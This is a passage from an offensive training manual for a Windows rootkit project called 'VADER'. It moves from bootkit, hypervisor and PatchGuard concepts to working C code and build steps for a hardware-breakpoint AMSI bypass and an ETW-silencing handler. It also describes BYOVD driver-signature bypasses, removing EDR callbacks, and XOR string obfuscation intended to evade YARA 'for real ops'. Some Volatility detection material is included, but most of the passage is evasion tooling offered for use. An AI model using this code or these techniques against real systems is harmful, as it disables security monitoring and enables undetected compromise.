## Section 8 — Bootkit Concept

A bootkit infects the boot process itself. Before the OS kernel loads,
your code runs and patches the kernel in memory. By the time the OS
starts, it's already compromised. PatchGuard loads into a kernel that
already has your modifications — it protects a system that is already
rooted.

```
BOOT SEQUENCE:
    UEFI firmware
        │
        ▼
    UEFI bootloader (bootmgfw.efi)   ← bootkit infection point 1
        │
        ▼
    Windows Boot Manager             ← bootkit infection point 2
        │
        ▼
    winload.exe                      ← bootkit infection point 3
        │
        ▼
    ntoskrnl.exe (kernel)            ← if not yet hooked, inject here
        │
        ▼
    SYSTEM process, PatchGuard       ← PatchGuard starts in a kernel
                                         that's already been modified
```

### Notable Bootkit Families

```
Bootkit/MBR:           Infects the Master Boot Record
    — Historical (pre-UEFI / pre-Secure Boot)
    — Dead on modern hardware with Secure Boot enabled

UEFI bootkit:          Infects the UEFI firmware or replaces bootmgfw.efi
    — FinFisher UEFI implant (2021 ESET research)
    — CosmicStrand (Kaspersky, 2022) — embedded in UEFI firmware
    — BlackLotus (ESET, 2023) — CVE-2022-21894 Secure Boot bypass
    — REQUIRES defeating Secure Boot or a firmware vulnerability

Secure Boot bypass:    Signed but vulnerable EFI binaries
    — CVE-2022-21894: Windows Boot Application signed SHIM
    — Loads unsigned bootkit before Secure Boot policy enforced
    — Patched, but bootkit installations persist on infected machines
```

A working bootkit in 2024+ requires:
- A Secure Boot bypass OR compromised signing cert OR physical access
- UEFI firmware knowledge
- Significant operational complexity

High reward (survives reimaging, defeats all OS-level defenses), high cost.

---

## Section 9 — Hypervisor Rootkit Concept

Move below the kernel. Insert a hypervisor between the hardware and
the OS. The OS runs as a VM. The hypervisor intercepts any operation
the OS attempts — memory access, I/O, MSR reads, everything.

```
NORMAL SYSTEM:
    Hardware
        │
    Windows (ring 0 = kernel)
        │
    Applications (ring 3 = user)

HYPERVISOR ROOTKIT:
    Hardware
        │
    Hypervisor (VMX root mode — ring -1, "ring -1")
        │
    Windows (now a VM — ring 0 relative to VM but not physical ring 0)
        │
    Applications
```

The hypervisor can intercept and modify EVERYTHING the OS reads from
hardware, including PatchGuard's integrity checks. PatchGuard reads
memory to verify it hasn't been modified — the hypervisor intercepts
that memory read and returns the "clean" original values.

### Blue Pill / BlueSpy Concept

```
1. Existing kernel-mode code (driver) calls VMXON
   — Takes physical control of CPU virtualisation extensions
   — "Sucks" the running OS into a VM silently

2. All future CPU operations by the OS go through VMCS (VM Control Structure)
   — Hypervisor gets notified on MSR accesses, I/O port accesses,
     memory accesses to specified regions (EPT violations)

3. EPT (Extended Page Tables) lets the hypervisor maintain a shadow
   memory view for the VM:
   — OS reads address X → hypervisor shows "clean" version
   — Actual physical address X has the modified (hooked) version
   — PatchGuard integrity check reads clean values → no BSOD
   — CPU actually executes modified values → hooks active
```

VirtioCore, HyperDbg, and hvpp demonstrate these concepts in public
research. Full implementation requires deep Intel VMX/AMD SVM knowledge.
Treat this as a threat model entry, not a weekend project.

---

## Section 10 — Detection: PatchGuard

PatchGuard's defence applies to x64 kernel only. Protections:

```
PROTECTED STRUCTURES:
    SSDT (KiServiceTable)
    Interrupt Descriptor Table (IDT)
    Global Descriptor Table (GDT)
    Critical kernel code (.text section of ntoskrnl, hal.dll, win32k.sys)
    EPROCESS fields (specific critical offsets, not all)
    Kernel object dispatch tables for core drivers

DETECTION METHOD:
    Encrypted, randomised timer — fires every N minutes (N = random, ~5-30 min)
    Runs in a code region that's obfuscated to defeat signature matching
    Compares current state of protected structures against stored checksums
    If mismatch: triggers BSOD 0x109 (CRITICAL_STRUCTURE_CORRUPTION)

WHAT IT DOESN'T PROTECT:
    Driver dispatch tables for non-core drivers
    User-mode memory (it's a kernel mechanism, doesn't watch ring 3)
    DKOM (the ActiveProcessLinks field — PatchGuard does NOT verify
          the linked list integrity of all EPROCESS objects)
    New memory regions you create (your driver's code, your hooks
          if they're in regions not being watched)

KEY POINT ON DKOM:
    Unlinking EPROCESS from ActiveProcessLinks is NOT directly caught
    by PatchGuard. PatchGuard verifies CODE regions. ActiveProcessLinks
    is data. You can unlink safely from PatchGuard's perspective.
    You can still be caught by OTHER mechanisms (see below).
```

---

## Section 11 — Detection: DSE (Driver Signature Enforcement)

To load a kernel driver on x64 Windows 10/11:

```
Requirements:
    Driver must be signed with:
    — Extended Validation (EV) certificate
    — OR Microsoft WHQL signature
    — OR test signing enabled (TESTSIGNING=ON boot option — obvious, logged)
    — OR DSE bypass technique

DSE bypass techniques:
    CI!g_CiEnabled patch (historical) — set code integrity flag to 0
        → Caught by PatchGuard (code integrity structures are watched)

    CVE-2022-21882 / BYOVD (Bring Your Own Vulnerable Driver):
        — Load a signed but vulnerable DRIVER
        — Exploit the driver from ring 3 to get kernel write primitive
        — Use kernel write to patch CI.dll in memory (DSE disable)
        — Load your unsigned driver
        — Restore CI.dll
        → Only the vulnerable driver needs a valid signature
        → Your rootkit driver is never submitted to MS for signing

    Notable BYOVD drivers:
        gdrv.sys (Gigabyte)     — arbitrary kernel read/write
        rtcore64.sys (ASUS)     — arbitrary kernel read/write
        DBUtil_2_3.sys (Dell)   — privilege escalation + kernel write
        mhyprot2.sys (miHoYo)   — arbitrary kernel read/write
```

---

## Section 12 — Detection: Kernel Callback Enumeration

Modern EDRs and security tools register kernel callbacks — legitimate
mechanisms to be notified of process creation, thread creation, image
loads, registry operations. Your rootkit competes against these for
early notification.

```
REGISTERED CALLBACK TYPES:
    PsSetCreateProcessNotifyRoutine    — fires on every process create/terminate
    PsSetCreateThreadNotifyRoutine     — fires on every thread create/terminate
    PsSetLoadImageNotifyRoutine        — fires when a PE is loaded (including DLLs)
    CmRegisterCallback                 — fires on registry operations
    ObRegisterCallbacks                — fires on object handle operations

TOOLS TO ENUMERATE REGISTERED CALLBACKS:
    WinDbg: dq nt!PspCreateProcessNotifyRoutine L20
    ARKitLib, kernel-callback-enum, DriverQuery
    PCHunter (user-mode tool that reads kernel directly)

ROOTKIT RESPONSE TO CALLBACKS:
    1. Enumerate callbacks → find the EDR's registered routine addresses
    2. Zero out the array entries → EDR no longer receives notifications
       (requires kernel write primitive)
    3. Or: overwrite the function pointer with a stub that returns success
       without doing anything

DETECTION OF CALLBACK MANIPULATION:
    EDR's callback not being called for a known event
    Callback array has nulls where populated entries were
    Count of registered callbacks drops unexpectedly
    Memory forensics: callback array history via snapshot comparison
```

---

## Section 13 — How Volatility Detects Rootkits

Volatility is a memory forensics framework. It analyzes raw memory images.
A live EDR can be blinded by your hooks. A memory image taken from
outside the OS cannot be blinded by user-mode or kernel-mode hooks —
it's raw bytes, read directly by a separate tool.

### pslist vs psscan Discrepancy

```
Volatility pslist:
    Walks EPROCESS ActiveProcessLinks — same list the kernel uses
    A DKOM-hidden process has been unlinked from this list
    pslist will NOT show the hidden process

Volatility psscan:
    Pool tag scan: searches raw memory for the EPROCESS pool allocation tag
    Windows kernel marks every EPROCESS allocation with tag 'Proc'
    Pool tag search finds EPROCESS objects even if they're not in the list
    psscan WILL show the hidden process

Discrepancy:
    pslist says: System, svchost, explorer, chrome
    psscan says: System, svchost, explorer, chrome, YOUR_IMPLANT.exe

    Any process that appears in psscan but NOT pslist is a smoking gun.
    DKOM is immediately visible to memory forensics.
```

### malfind

```
Volatility malfind:
    Searches process memory for regions that are:
    — Executable
    — Not backed by a file on disk (private committed memory)
    — Contain MZ/PE header signatures

    Output: suspected injected code regions, shown with hex dump
    and disassembly of first few instructions

    CATCHES:
        — Reflective DLL injection (PE in heap, no file backing)
        — Shellcode injection (executable private memory)
        — Process hollowing (PE headers don't match file on disk)

    DOES NOT CATCH:
        — Injected code that has had its PE headers wiped
          (stomp the MZ + PE headers after loading — malfind won't see the sig)
        — Injected code that's been marked non-executable after execution
          (execute, then flip back to RW — but timing is hard)
```

### Other Volatility Plugins

```
volatility -f memory.img windows.dlllist    — module list per process
    Compare against baseline. Extra modules = injected DLLs.

volatility -f memory.img windows.handles   — all handle objects
    Orphan handles to deleted processes may indicate rootkit remnants.

volatility -f memory.img windows.ssdt      — SSDT function addresses
    Compare against known-good values from a clean system image.
    Modified entries = SSDT hook.

volatility -f memory.img windows.callbacks — kernel callback table
    List all registered PsSetCreateProcessNotifyRoutine entries etc.
    Unknown callback addresses = rootkit.

volatility -f memory.img windows.driverirp — IRP dispatch tables
    Compare driver major function pointers against module ranges.
    Pointer outside any loaded driver = IRP hook.
```

---

## How AMSI Works — The Scan Path

AMSI is Antimalware Scan Interface. Microsoft built it into Windows 10
so that script hosts (PowerShell, WScript, Office macros, .NET) can
pass script content to the registered AV engine BEFORE executing it.

If you run a malicious PowerShell script, AMSI sees the content first.
The AV engine scans it. If it matches a signature, execution is blocked.
Understanding the exact call path tells you exactly where to cut the wire.

### The Full Call Chain

```
User runs PowerShell script
        │
        ▼
powershell.exe loads the script content into memory
        │
        ▼
PowerShell runtime calls amsi.dll!AmsiScanBuffer()
        │
        ▼
AmsiScanBuffer sends buffer to registered AV provider
        │  (WMI provider, Defender's MpOav.dll)
        ▼
AV engine scans the buffer content
        │
        ▼
Returns one of:
    AMSI_RESULT_CLEAN       (0x1) — allow execution
    AMSI_RESULT_DETECTED    (0x8) — block, alert user
        │
        ▼
PowerShell checks return value:
    CLEAN → execute the script
    DETECTED → throw "This script contains malicious content" error
```

### AmsiScanBuffer — Location in Memory

```
AmsiScanBuffer lives in:
    C:\Windows\System32\amsi.dll

Load path at runtime:
    PowerShell process starts
    Windows loader automatically loads amsi.dll (it's a required import)
    amsi.dll maps into the PowerShell process address space
    AmsiScanBuffer is at:  amsi.dll base address + export RVA

To find the address at runtime:
    HMODULE h = LoadLibraryA("amsi.dll");          // get base
    FARPROC fn = GetProcAddress(h, "AmsiScanBuffer"); // get export
    // fn now holds the address where AmsiScanBuffer starts executing
```

### What AMSI_RESULT_CLEAN (0x1) Means

```
AmsiScanBuffer return value is HRESULT type.
HRESULT 0 = S_OK (success).
HRESULT 0x80070057 = E_INVALIDARG (invalid argument).

The AMSI result is written to an output parameter, not the HRESULT:
    HRESULT hr = AmsiScanBuffer(ctx, buf, len, name, session, &result);

If hr is an error code (E_INVALIDARG, etc.):
    PowerShell treats the scan as INCONCLUSIVE
    By default, inconclusive = allow execution
    This is the bypass: make AmsiScanBuffer return an error code
    without doing any scanning

AMSI_RESULT values (written to &result):
    AMSI_RESULT_CLEAN         = 0   (no threat found)
    AMSI_RESULT_NOT_DETECTED  = 1   (not detected)
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000
    AMSI_RESULT_DETECTED      = 0x8000 (malware found — block this)

The bypass doesn't need to forge AMSI_RESULT_CLEAN.
It only needs to make AmsiScanBuffer return E_INVALIDARG (0x80070057).
PowerShell sees an error, gives up on scanning, allows execution.
```

### Classic Patch vs. HWBP

```
CLASSIC PATCH (detected):
    VirtualProtect(amsi.dll code page, RW)     ← Defender behavioral rule fires here
    memcpy patch bytes into AmsiScanBuffer     ← amsi.dll memory modified
    VirtualProtect(amsi.dll code page, back)

    Detection vector: Behavior:Win32/AMSI_Patch_T.B12
    Fires on VirtualProtect + write to amsi.dll's code region.
    AV compares amsi.dll bytes to on-disk copy → mismatch → alert.

HWBP BYPASS (VADER technique):
    LoadLibrary + GetProcAddress → get AmsiScanBuffer address
    AddVectoredExceptionHandler → register our intercept handler
    SetThreadContext → write AmsiScanBuffer address into DR0, enable DR7

    amsi.dll code: UNTOUCHED. Zero bytes modified. No VirtualProtect.
    Detection vector: none currently known at standard user privilege.
```

---

## Hardware Breakpoints — DR0 to DR7 Explained

Every x86/x64 CPU has a set of debug registers built into the silicon.
They exist to help debuggers set breakpoints without modifying the code
being debugged. That same mechanism is available to any user-mode process —
no admin, no kernel driver required.

This is your primitive. The CPU itself becomes the hook.

### The Debug Register Set

```
DR0  — Breakpoint address register 0
DR1  — Breakpoint address register 1
DR2  — Breakpoint address register 2
DR3  — Breakpoint address register 3
       (four breakpoints maximum — hardware limit)

DR4  — Alias of DR6 (legacy, ignore)
DR5  — Alias of DR7 (legacy, ignore)

DR6  — Debug status register
       Read-only (set by CPU when breakpoint fires)
       Bit 0: DR0 breakpoint was the one that triggered
       Bit 1: DR1 breakpoint was the one that triggered
       Bit 2: DR2 breakpoint was the one that triggered
       Bit 3: DR3 breakpoint was the one that triggered
       Bit 14: single-step flag (TF triggered this, not a DR)

DR7  — Debug control register
       Enables/disables each DR and sets conditions
```

### DR7 Bit Layout

```
DR7 controls ALL four breakpoints. Here's the encoding:

  Bit 0   (L0): Local enable for DR0   (1 = active, 0 = disabled)
  Bit 1   (G0): Global enable for DR0  (persists across task switches)
  Bit 2   (L1): Local enable for DR1
  Bit 3   (G1): Global enable for DR1
  Bit 4   (L2): Local enable for DR2
  Bit 5   (G2): Global enable for DR2
  Bit 6   (L3): Local enable for DR3
  Bit 7   (G3): Global enable for DR3

  Bits 16-17 (C0): Condition for DR0
      00 = execution breakpoint (fires when RIP hits the address)
      01 = write watchpoint     (fires when address is written)
      11 = read/write watchpoint (fires on any access)
      10 = I/O read/write       (requires CPL 0 — kernel only)

  Bits 18-19 (S0): Length for DR0
      00 = 1 byte  (REQUIRED for execution breakpoints)
      01 = 2 bytes (for data watchpoints)
      10 = 8 bytes (for data watchpoints, x64 only)
      11 = 4 bytes (for data watchpoints)

  Bits 20-23: same layout for DR1
  Bits 24-27: same layout for DR2
  Bits 28-31: same layout for DR3

For a single execution breakpoint on DR0:
    Enable L0:    DR7 |= 0x1
    Condition 00 (execution) + length 00 (1 byte): bits 16-19 = 0x0
    Final DR7 value: 0x00000001
```

### Why Hardware Breakpoints Win

```
SOFTWARE BREAKPOINTS (int3 / 0xCC):
    Debugger patches the function's first byte with 0xCC (INT3)
    CPU executes 0xCC → raises EXCEPTION_BREAKPOINT
    AV integrity check reads amsi.dll bytes → sees 0xCC → alert
    Memory modification required → detectable

HARDWARE BREAKPOINTS (DR0-DR3):
    No code modification whatsoever
    No memory pages touched
    Set via debug registers in the thread context structure
    CPU monitors DR0-DR3 natively during instruction fetch
    When RIP matches DR0 address:
        CPU raises EXCEPTION_SINGLE_STEP before executing the instruction
        OS dispatches to Vectored Exception Handler chain
        Your handler runs, simulates a return, execution resumes elsewhere

    amsi.dll code bytes: IDENTICAL to the on-disk file
    VirtualProtect: NEVER CALLED
    Integrity checks: find nothing wrong
    Memory forensics: amsi.dll looks clean
```

### DR Registers Are Per-Thread

```
This is critical to understand:

    Hardware breakpoints are stored in the THREAD CONTEXT.
    Each thread has its own DR0-DR3 values.
    Setting DR0 on thread A does NOT affect thread B.

Consequence:
    Set HWBP on your current thread → only intercepts AmsiScanBuffer
    calls made FROM that thread.

    If you spawn a child process (PowerShell), the child's threads
    start with DR0=0, DR7=0 — no breakpoint.

    Solution for child processes:
        Inject into the child and set DR0 there (Chapter 10 tech)
        Or host the script inside your own process via IDispatch
        Or use a different bypass method for spawned children
```

### Accessing Debug Registers from User Mode

```c
// GetThreadContext / SetThreadContext — standard Win32 API
// CONTEXT_DEBUG_REGISTERS flag tells the API to include DR0-DR7

CONTEXT ctx;
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;   // read/write DR registers
GetThreadContext(GetCurrentThread(), &ctx);   // read current values

// ctx.Dr0 = DR0 current value
// ctx.Dr1 = DR1 current value
// ctx.Dr2 = DR2 current value
// ctx.Dr3 = DR3 current value
// ctx.Dr6 = DR6 status (read-only — don't write this)
// ctx.Dr7 = DR7 control

ctx.Dr0 = (DWORD64)target_function_address;  // set breakpoint address
ctx.Dr7 |= 1;                                // enable DR0 (local, execution)

SetThreadContext(GetCurrentThread(), &ctx);   // apply changes
// From this point, any execution at target_function_address fires EXCEPTION_SINGLE_STEP
```

// DRILL: Open WinDbg, attach to any process, set a hardware breakpoint with
// `ba e1 ntdll!NtCreateFile` — confirm the breakpoint fires on the next CreateFile.
// Then clear it with `bc *`. Observe that no bytes in ntdll changed.

---

## HWBP AMSI Bypass — amsi_bypass_hwbp_annotated.c Line by Line

This is the VADER rootkit's AMSI bypass component. Filed as Finding #33
after the classic memory-patch bypass (Finding #31) was caught by
Defender's behavioral rule `Behavior:Win32/AMSI_Patch_T.B12`.

The full source is at: `C:/Users/gwu07/Desktop/vader-rootkit/amsi/amsi_bypass_hwbp_annotated.c`

Walk through it in order. Every function is explained.

### XOR-Encoded Strings (Lines 73-98)

```c
#define XOR_KEY 0x41

/* "amsi.dll" XOR 0x41 */
static const unsigned char xAmsiDll[] = {
    0x20, 0x2C, 0x32, 0x28, 0x6F, 0x25, 0x2D, 0x2D
};

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}
```

Do not store "amsi.dll" or "AmsiScanBuffer" as plaintext strings in your binary.
Static analysis tools scan binary strings. Yara rules match them.
XOR the strings with a key at compile time. Decode at runtime, use, then
zero the buffer with `memset`.

Key 0x41 is the letter 'A'. Simple but sufficient. For real ops, use a
random key per build.

### Phase 1: locate_amsi_scan_buffer() (Lines 126-161)

```c
static void *locate_amsi_scan_buffer(void) {
    HMODULE hAmsi;
    void *pFunc;
    unsigned char dllName[16];
    unsigned char funcName[32];

    // Decode "amsi.dll" from XOR-encoded bytes
    memcpy(dllName, xAmsiDll, xAmsiDll_LEN);
    xor_decode(dllName, xAmsiDll_LEN);
    dllName[xAmsiDll_LEN] = 0;   // null terminate

    // Decode "AmsiScanBuffer"
    memcpy(funcName, xAmsiScanBuffer, xAmsiScanBuffer_LEN);
    xor_decode(funcName, xAmsiScanBuffer_LEN);
    funcName[xAmsiScanBuffer_LEN] = 0;

    hAmsi = LoadLibraryA((char *)dllName);     // loads amsi.dll if not already loaded
    pFunc = (void *)GetProcAddress(hAmsi, (char *)funcName);  // resolves the export address

    // Zero the decoded strings before they leave scope
    memset(dllName, 0, sizeof(dllName));
    memset(funcName, 0, sizeof(funcName));

    return pFunc;  // pointer to AmsiScanBuffer's first instruction
}
```

`LoadLibraryA` maps amsi.dll into the process if it isn't already.
`GetProcAddress` walks amsi.dll's export table to find the RVA of
AmsiScanBuffer, then adds the DLL base to return the absolute address.

This is the same address you will put into DR0.

### The VEH Handler: AmsiBreakpointHandler() (Lines 188-217)

This is the core. Study every line.

```c
static LONG WINAPI AmsiBreakpointHandler(PEXCEPTION_POINTERS pExInfo) {

    // Step 1: Filter — only handle EXCEPTION_SINGLE_STEP
    // EXCEPTION_SINGLE_STEP fires when a hardware breakpoint triggers
    // (or when the TF flag is set, but we only care about DR0)
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;   // not ours — pass to next handler

    // Step 2: Filter — only handle breakpoints AT our target address
    // pExInfo->ContextRecord->Rip = current instruction pointer (RIP register)
    // g_pAmsiScanBuffer = address of AmsiScanBuffer's first instruction
    if ((void *)pExInfo->ContextRecord->Rip != g_pAmsiScanBuffer)
        return EXCEPTION_CONTINUE_SEARCH;   // wrong address — not our breakpoint

    // Step 3: We're inside the EXCEPTION_SINGLE_STEP handler for AmsiScanBuffer.
    // RIP is currently AT AmsiScanBuffer's entry — the function has NOT started yet.
    // The CPU suspended execution before running the first instruction.

    // Simulate "mov eax, E_INVALIDARG; ret" by manipulating the CPU context:

    // Set RAX = E_INVALIDARG (0x80070057)
    // RAX is the return value register in x64 System V / Microsoft calling convention
    // After we return from the VEH handler with CONTINUE_EXECUTION,
    // the caller of AmsiScanBuffer will read RAX as the HRESULT return value
    pExInfo->ContextRecord->Rax = (DWORD64)0x80070057;

    // Simulate "ret": pop the return address from the stack into RIP
    // [RSP] holds the return address pushed by the CALL instruction that called AmsiScanBuffer
    // Dereferencing RSP gives us that address
    pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;

    // Adjust RSP: "ret" normally does RSP += 8 (pops the return address)
    pExInfo->ContextRecord->Rsp += 8;

    // Tell the OS: resume execution at the new RIP (the caller's next instruction)
    // AmsiScanBuffer's code never ran. Caller sees E_INVALIDARG return value.
    return EXCEPTION_CONTINUE_EXECUTION;
}
```

The CPU context structure (`CONTEXT`) is live. Modifying it here modifies
actual register values when execution resumes. This is standard behavior —
debuggers do exactly this to change register state mid-execution.

### set_hwbp(): Writing Debug Registers (Lines 243-303)

```c
static BOOL set_hwbp(void *pTarget) {
    CONTEXT ctx;
    HANDLE hThread = GetCurrentThread();    // handle to this thread

    // Read current thread context, specifically the debug registers
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;   // only read DR0-DR7
    GetThreadContext(hThread, &ctx);

    // Write AmsiScanBuffer address into DR0
    ctx.Dr0 = (DWORD64)pTarget;

    // Configure DR7:
    // Clear DR0's condition and length bits first (bits 16-19)
    ctx.Dr7 &= ~(0xFULL << 16);
    // Set bit 0 (L0 = local enable for DR0)
    // Condition 00 (execution), length 00 (1 byte) — both already zero after clear
    ctx.Dr7 |= 1;

    // Apply the modified context — this writes to the actual CPU registers
    SetThreadContext(hThread, &ctx);

    // Verify: re-read and confirm DR0 was set correctly
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(hThread, &ctx);

    return (ctx.Dr0 == (DWORD64)pTarget);  // TRUE if set successfully
}
```

### Phase Sequence in main()

```
PHASE 1: locate_amsi_scan_buffer()
    → decode strings, LoadLibrary, GetProcAddress
    → returns pointer to AmsiScanBuffer's first byte
    → store in g_pAmsiScanBuffer (global, read by VEH handler)

PHASE 2a: AddVectoredExceptionHandler(1, AmsiBreakpointHandler)
    → register our handler FIRST in the VEH chain (param 1 = front)
    → MUST be before setting the breakpoint — or the exception fires
      before we have a handler and the process crashes

PHASE 2b: set_hwbp(pAmsiScanBuffer)
    → GetThreadContext, write DR0 = target address, DR7 |= 1
    → SetThreadContext — breakpoint is now armed

PHASE 3: test_amsi_bypass()
    → call AmsiScanBuffer directly with dummy args
    → CPU hits DR0 → EXCEPTION_SINGLE_STEP → VEH handler intercepts
    → VEH sets RAX = E_INVALIDARG, adjusts RIP and RSP
    → CONTINUE_EXECUTION → resumes in caller
    → check returned HRESULT == 0x80070057 → BYPASS CONFIRMED

PHASE 4: spawn_powershell()
    → CreateProcessA for powershell.exe
    → NOTE: child process has its own thread contexts, DR0 = 0
    → For child bypass: inject and set DR0 in child threads
```

### Expected VEH Handler Flow (Annotated)

```
Thread calls AmsiScanBuffer:
    CALL AmsiScanBuffer     ; pushes return address onto stack, jumps to AmsiScanBuffer

CPU begins instruction fetch at AmsiScanBuffer:
    DR0 == RIP              ; hardware match detected
    CPU raises EXCEPTION_SINGLE_STEP before executing the instruction

OS exception dispatch:
    Walks VEH chain
    Finds our AmsiBreakpointHandler (registered first)
    Calls it with PEXCEPTION_POINTERS

AmsiBreakpointHandler executes:
    ExceptionCode == EXCEPTION_SINGLE_STEP: yes
    Rip == g_pAmsiScanBuffer: yes
    Rax = 0x80070057               ; set return value
    Rip = *(DWORD64*)Rsp           ; pop return address → new RIP
    Rsp += 8                       ; adjust stack (simulate ret)
    return EXCEPTION_CONTINUE_EXECUTION

OS resumes execution:
    RIP = caller's next instruction (the one after the CALL AmsiScanBuffer)
    RAX = 0x80070057
    Stack balanced correctly
    AmsiScanBuffer code never ran
    Caller reads RAX as the return value: E_INVALIDARG

PowerShell checks HRESULT:
    hr != S_OK → scan inconclusive → allow execution
    Script runs with no AMSI scanning
```

// DRILL: Compile amsi_hwbp.exe, run it with `--test` flag, read the output.
// Confirm "BYPASS CONFIRMED" and "0 bytes modified in amsi.dll".
// Then run without flags, attempt to run an EICAR string in the spawned
// PowerShell — confirm 0 detections.

---

## ETW Bypass — Silencing the Event Trace

You bypassed AMSI. The script content is no longer scanned. But there is
a second layer: ETW — Event Tracing for Windows.

ETW is the kernel's telemetry bus. Every significant event in Windows
gets written to ETW: process creation, network connections, registry
writes, DLL loads, syscalls. EDR products (CrowdStrike, SentinelOne,
Defender for Endpoint) consume ETW streams for their runtime behavioral
analysis. If they can't get the events, they're flying blind.

### What NtTraceEvent Does

```
Call chain for an ETW event:
    Any component wants to log an event
        │
        ▼
    EtwEventWrite()           ← exported from ntdll.dll
        │
        ▼
    EtwEventWriteFull()       ← internal routing
        │
        ▼
    NtTraceEvent()            ← syscall into kernel
        │
        ▼
    Kernel ETW subsystem      ← writes to circular buffer
        │
        ▼
    ETW consumer sessions     ← EDR reads from here in real time

EtwEventWrite is the choke point. It's called by:
    PowerShell (script execution events)
    .NET CLR (method JIT events — gives EDR full .NET execution trace)
    Windows security audit subsystem
    Every WMI provider
    Your implant, when it calls WinAPI functions that internally log
```

### Why EDRs Depend on ETW

```
Without ETW visibility:
    EDR cannot see PowerShell script content (AMSI is the other layer)
    EDR cannot see .NET method execution sequences
    EDR cannot correlate process events with network events
    EDR behavioral rules require event sequences — no events, no rules
    Memory scanning is the fallback (slower, periodic, misses transient events)

With AMSI bypassed AND ETW silenced:
    Script content: invisible (no AMSI scan)
    Execution trace: invisible (no ETW events)
    EDR is running on assumptions and memory scans only
    Detection surface reduced dramatically
```

### HWBP on EtwEventWrite — The Same Trick

The VADER ETW bypass in `etw_hwbp_annotated.c` uses an identical mechanism
to the AMSI bypass, targeting a different function in a different DLL.

```
AMSI bypass:   DR0 = AmsiScanBuffer in amsi.dll
ETW bypass:    DR1 = EtwEventWrite in ntdll.dll

Combined (dark_room.c):
    DR0 = AmsiScanBuffer    (Phase 1)
    DR1 = EtwEventWrite     (Phase 2)
    DR2-DR3 = available for future interceptions

Both VEH handlers check ExceptionCode and Rip, then:
    AmsiBreakpointHandler: RAX = E_INVALIDARG (0x80070057)
    EtwEventBreakpointHandler: RAX = 0 (STATUS_SUCCESS — silently "succeeds")
```

### ETW VEH Handler Logic

```c
// From etw_hwbp_annotated.c (same pattern as AMSI handler)
static LONG WINAPI EtwBreakpointHandler(PEXCEPTION_POINTERS pExInfo) {

    // Only handle hardware breakpoint exceptions
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    // Only intercept at EtwEventWrite's entry point
    if ((void *)pExInfo->ContextRecord->Rip != g_pEtwEventWrite)
        return EXCEPTION_CONTINUE_SEARCH;

    // Simulate "return STATUS_SUCCESS":
    // RAX = 0 (NTSTATUS 0 = STATUS_SUCCESS = no error = event "written")
    // Caller sees success. Event was NOT sent to kernel. Telemetry dead.
    pExInfo->ContextRecord->Rax = 0;

    // Simulate ret: pop return address, adjust stack
    pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
    pExInfo->ContextRecord->Rsp += 8;

    return EXCEPTION_CONTINUE_EXECUTION;
}
```

The key difference from AMSI: return value is 0 (STATUS_SUCCESS), not E_INVALIDARG.
EtwEventWrite callers check for failure. Returning success means no retry, no
alternative logging path triggered.

### What Goes Silent When ETW is Bypassed

```
Silenced event channels:
    Microsoft-Windows-PowerShell/Operational (EventID 4103, 4104)
        — Script block logging: the full content of every PS script
    Microsoft-Windows-DotNETRuntimeRundown
        — CLR method calls, JIT compilation events
    Microsoft-Windows-Security-Auditing
        — Process creation (EventID 4688) when run from .NET context
    Microsoft-Windows-Threat-Intelligence (ETWTI)
        — Memory allocation events, PE loads, injection markers
        — This channel is specifically built for EDR products

What still works for defenders:
    Kernel-level ETW (EtwTi) that bypasses EtwEventWrite
    Direct kernel callbacks (PsSetLoadImageNotifyRoutine, etc.)
    Network sensors (separate from ETW — host-based bypass doesn't affect these)
    Memory forensics (snapshot-based, not stream-based)
```

### Locate EtwEventWrite

```c
// Same pattern as AmsiScanBuffer location:
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");  // already loaded in every process
void *pEtwEventWrite = (void *)GetProcAddress(hNtdll, "EtwEventWrite");

// Store in global for VEH handler:
g_pEtwEventWrite = pEtwEventWrite;

// Then: AddVectoredExceptionHandler, set_hwbp with DR1 instead of DR0
```

Note: use `GetModuleHandleA` (not `LoadLibraryA`) for ntdll.dll — it's
ALWAYS loaded in every Windows process. LoadLibrary would work too but
GetModuleHandle avoids an unnecessary load call.

// DRILL: Compile etw_hwbp.exe with `--test` flag. Confirm EtwEventWrite
// address is resolved and the bypass fires. Then open Process Monitor
// (Sysinternals) and observe that ETW-sourced events from your test process
// disappear from the event stream while the bypass is active.

---

## Build + Test — Prove AMSI is Bypassed

Do this in order. Every step has an expected output. If the expected output
does not match, stop and diagnose before proceeding.

### Step 1 — Build amsi_hwbp.exe

Open "Developer Command Prompt for VS 2022" (not regular PowerShell).

```
cd C:\Users\gwu07\Desktop\vader-rootkit\amsi

cl.exe amsi_bypass_hwbp_annotated.c /Fe:amsi_hwbp.exe /O1 /GS-
```

Flag meanings:
- `/Fe:amsi_hwbp.exe` — output filename
- `/O1` — optimize for size (smaller binary, faster)
- `/GS-` — disable stack buffer security checks (avoid CRT dependency)

**EXPECTED OUTPUT:**
```
Microsoft (R) C/C++ Optimizing Compiler Version 19.xx.xxxxx for x64
Copyright (C) Microsoft Corporation. All rights reserved.

amsi_bypass_hwbp_annotated.c
Microsoft (R) Incremental Linker Version 14.xx.xxxxx.x
Copyright (C) Microsoft Corporation. All rights reserved.

/out:amsi_hwbp.exe
amsi_bypass_hwbp_annotated.obj
```

Verify the binary exists:
```
dir amsi_hwbp.exe
```

**EXPECTED OUTPUT:**
```
10/15/2024  02:34 PM            14,336 amsi_hwbp.exe
```

If `error C1XX` or `LNK2019` errors appear: you're not in the VS Developer
Command Prompt. Close and reopen the correct prompt.

### Step 2 — Run in Check Mode (No Bypass Yet)

```
amsi_hwbp.exe --check
```

**EXPECTED OUTPUT:**
```
  --- PHASE 1: LOCATE AMSI ---

  [+] amsi.dll loaded at 0x00007FFF3A2B0000
